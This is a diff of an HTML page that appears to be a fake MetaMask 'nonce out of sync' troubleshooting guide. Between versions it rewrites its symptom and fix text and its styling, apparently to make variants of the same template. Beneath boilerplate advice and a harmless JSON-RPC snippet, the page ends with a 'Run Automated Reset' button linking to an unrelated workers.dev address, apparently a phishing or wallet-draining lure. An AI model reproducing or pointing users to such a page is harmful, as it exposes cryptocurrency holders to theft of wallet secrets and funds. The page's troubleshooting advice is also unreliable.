@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #121214;
+        font-family: system-ui;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #00adb5; }
     .btn {
         background: #ff7b2c;
         color: #000;
@@ -41,28 +41,33 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "nonce out of sync" error when attempting to send a transaction using MetaMask on the Ethereum (ETH) network, indicating a discrepancy between the expected and actual nonce values.</li>
+<li>The user encounters an error message stating "MetaMask nonce out of sync" when attempting to send a transaction on the Ethereum (ETH) network, indicating a discrepancy between the expected and actual nonce values.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a mismatch between the nonce value stored in MetaMask and the actual nonce value on the Ethereum blockchain, often resulting from cancelled or failed transactions that were not properly accounted for.</li>
+<li>The error occurs due to a mismatch between the nonce value stored in MetaMask and the actual nonce value on the Ethereum blockchain, often resulting from concurrent transactions or wallet resets.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the account in MetaMask to resynchronize the nonce value:</li>
-<li>Delete the MetaMask extension and reinstall it</li>
-<li>Clear the browser's local storage to remove any cached data</li>
-<li>Use the following command to reset the nonce value manually:</li>
+<li>To resolve the issue, try the following steps:</li>
+<li>Reset the MetaMask account to synchronize the nonce value with the blockchain.</li>
+<li>Manually adjust the nonce value in the transaction settings to match the expected value.</li>
+<li>Utilize the following JSON-RPC method to update the nonce:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Resetting nonce value...&quot;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_getTransactionCount&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;latest&quot;</span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and manual override capabilities. </p>
+<p>Consider utilizing an external console to execute the JSON-RPC method for a more straightforward resolution.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>MetaMask extension installed and configured</li>
-<li>Ethereum wallet with a sufficient balance</li>
-<li>Stable internet connection for blockchain synchronization</li>
+<li>MetaMask wallet installed and configured</li>
+<li>Ethereum blockchain connection established</li>
+<li>Basic understanding of JSON-RPC methods and transaction management</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
